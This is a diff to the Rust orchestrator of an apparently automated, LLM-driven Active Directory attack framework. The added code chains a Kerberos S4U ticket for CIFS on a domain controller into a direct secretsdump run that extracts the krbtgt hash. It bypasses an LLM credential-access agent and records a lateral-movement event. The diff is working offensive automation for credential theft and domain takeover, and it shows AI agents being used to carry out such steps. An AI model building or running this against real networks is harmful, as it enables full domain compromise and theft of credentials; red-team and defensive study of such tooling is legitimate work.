@@ -25,10 +25,13 @@ use redis::aio::ConnectionLike;
 use serde_json::Value;
 use tracing::{debug, info, warn};
 
+use crate::orchestrator::automation::{
+    dispatch_krbtgt_extraction_with_ticket, krbtgt_extraction_dedup_key,
+};
 use crate::orchestrator::dispatcher::Dispatcher;
 use crate::orchestrator::output_extraction;
 use crate::orchestrator::results::CompletedTask;
-use crate::orchestrator::state::{SharedState, DEDUP_LATERAL_DENIED};
+use crate::orchestrator::state::{SharedState, DEDUP_LATERAL_DENIED, DEDUP_SECRETSDUMP};
 use crate::orchestrator::task_queue::TaskQueueCore;
 use crate::orchestrator::throttling::Throttler;
 
@@ -1328,6 +1331,72 @@ async fn auto_chain_s4u_secretsdump(
     let username = get_param("impersonate")
         .or_else(|| get_param("username"))
         .unwrap_or("Administrator");
+
+    // Fast path: a CIFS S4U landed against a known DC ⇒ the impersonated
+    // principal has SMB-as-Administrator on the DC, which is one DRSUAPI call
+    // away from the krbtgt hash. Skip the generic LLM `credential_access`
+    // agent (which can drop `-just-dc-user`, mis-shape `-no-pass`, or pick
+    // the wrong realm prefix) and dispatch secretsdump directly via the
+    // tool dispatcher. On success we mark the krbtgt dedup and emit the
+    // lateral-movement timeline event, then return so the LLM fallback
+    // below doesn't double-fire.
+    let spn_lc = get_param("target_spn").unwrap_or("").to_lowercase();
+    if spn_lc.starts_with("cifs/") && !domain.is_empty() {
+        let dc_match = {
+            let state = dispatcher.state.read().await;
+            state
+                .all_domains_with_dcs()
+                .into_iter()
+                .find(|(d, ip)| ip == &resolved_ip && d.eq_ignore_ascii_case(domain))
+        };
+        if let Some((dc_domain, dc_ip)) = dc_match {
+            let dedup = krbtgt_extraction_dedup_key(&dc_ip, &dc_domain);
+            let already = {
+                let state = dispatcher.state.read().await;
+                state.is_processed(DEDUP_SECRETSDUMP, &dedup)
+            };
+            if !already {
+                {
+                    let mut state = dispatcher.state.write().await;
+                    state.mark_credential_capture_in_flight(&dc_domain);
+                }
+                let landed = dispatch_krbtgt_extraction_with_ticket(
+                    dispatcher,
+                    &dc_ip,
+                    &dc_domain,
+                    username,
+                    &ticket_path,
+                )
+                .await;
+                if landed {
+                    {
+                        let mut state = dispatcher.state.write().await;
+                        state.mark_processed(DEDUP_SECRETSDUMP, dedup.clone());
+                    }
+                    let _ = dispatcher
+                        .state
+                        .persist_dedup(&dispatcher.queue, DEDUP_SECRETSDUMP, &dedup)
+                        .await;
+                    info!(
+                        parent_task = %task_id,
+                        dc = %dc_ip,
+                        domain = %dc_domain,
+                        ticket = %ticket_path,
+                        "S4U auto-chain: direct krbtgt extraction succeeded — skipping LLM fallback"
+                    );
+                    create_lateral_movement_timeline_event(dispatcher, &dc_ip, &ticket_path).await;
+                    return;
+                }
+                warn!(
+                    parent_task = %task_id,
+                    dc = %dc_ip,
+                    domain = %dc_domain,
+                    "S4U auto-chain: direct krbtgt extraction failed — falling back to LLM secretsdump"
+                );
+            }
+        }
+    }
+
     let sd_payload = serde_json::json!({
         "technique": "secretsdump",
         "techniques": ["secretsdump"],
